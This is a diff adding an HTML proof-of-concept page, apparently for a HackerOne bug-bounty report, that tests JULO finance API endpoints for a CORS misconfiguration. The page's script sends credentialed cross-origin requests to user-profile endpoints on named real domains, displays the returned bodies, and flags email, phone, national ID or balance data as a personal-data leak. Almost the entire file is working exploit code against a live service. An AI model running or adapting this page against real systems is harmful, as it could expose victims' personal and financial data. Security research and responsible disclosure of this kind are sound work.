@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>PoC JULO - Naffinc</title>
+<style>
+body{background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px}
+h2{color:#00ff00;border-bottom:1px solid #00ff00;padding-bottom:10px}
+.box{padding:14px;margin:12px 0;border-radius:8px;font-weight:bold}
+.low{background:#00ff00;color:#000} .medium{background:orange;color:#000}
+.high{background:yellow;color:#000} .critical{background:red;color:#fff}
+pre{background:#111;border:1px solid #333;padding:12px;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow:auto}
+button{background:#00ff00;color:#000;border:0;padding:10px 18px;font-weight:bold;cursor:pointer;border-radius:6px}
+ small{color:#888}
+</style>
+</head>
+<body>
+<h2>PoC JULO CORS - HackerOne: Naffinc</h2>
+<p>Domain: <b>api.julofinance.com (IN-SCOPE)</b> | Origin: https://naffincindonesia.github.io/poc-julo.html</p>
+<button onclick="run()">RUN TEST - MINIMAL MEDIUM</button>
+<div id="status" class="box low">READY - Klik RUN</div>
+<div id="out"></div>
+
+<script>
+const endpoints = [
+  "https://api.julofinance.com/api/user",
+  "https://api.julofinance.com/api/user/me",
+  "https://api.julo.co.id/api/user",
+  "https://crm.julo.co.id/api/user"
+];
+
+async function run(){
+  const out = document.getElementById('out');
+  const status = document.getElementById('status');
+  out.innerHTML = ""; status.className="box medium"; status.innerText="TESTING... Target minimal ORANGE MEDIUM";
+
+  let foundMedium = false;
+  for(let url of endpoints){
+    try{
+      let res = await fetch(url, {credentials:'include'});
+      let txt = await res.text();
+      let acao = res.headers.get('access-control-allow-origin');
+      let acac = res.headers.get('access-control-allow-credentials');
+      
+      let sev="low", cls="low";
+      if(acao && acac==="true"){
+        if(txt.length>50 && !txt.includes("404") && !txt.includes("<html")){
+          sev="MEDIUM - Data Leak + CORS Credentials"; cls="medium"; foundMedium=true;
+          if(txt.match(/email|phone|nik|balance|saldo/i)) { sev="HIGH/CRITICAL - PII LEAK"; cls="critical"; }
+        } else if(acao) { sev="MEDIUM - CORS Reflect + Creds true"; cls="medium"; foundMedium=true; }
+      }
+      
+      out.innerHTML += `<div class="box ${cls}">${sev} - ${url}<br><small>ACAO: ${acao} | ACAC: ${acac}</small></div><pre>${txt.substring(0,1500)}</pre>`;
+    }catch(e){
+      out.innerHTML += `<div class="box low">LOW - ${url} Blocked/CORS Fail</div><pre>${e}</pre>`;
+    }
+  }
+  if(foundMedium){
+    status.className="box medium";
+    status.innerText="HASIL: MEDIUM ORANGE VALID - Siap submit ke JULO";
+  } else {
+    status.className="box low";
+    status.innerText="HASIL: LOW - Coba endpoint lain / pakai cookie login";
+  }
+}
+</script>
+</body>
+</html>
